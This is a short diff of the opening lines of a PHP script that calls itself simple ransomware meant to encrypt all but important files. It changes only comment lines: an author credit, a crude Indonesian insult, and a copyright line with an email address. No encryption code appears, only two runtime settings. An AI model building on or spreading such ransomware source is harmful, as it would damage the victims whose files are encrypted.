@@ -1,8 +1,8 @@
 <?php
 // Ransomware Sederahana v1
-// Encrypt semua file kecuali file penting (Delete author gabikin kau pro kontol)
-// by 0x6ick-6ickZone
-
+// Encrypt semua file kecuali file penting (ngapain cb)
+//Copyright 2025 by 0x6ick(6ickZone)6ickwhisper@gmail.com
+          
 set_time_limit(0);
 error_reporting(0);
 
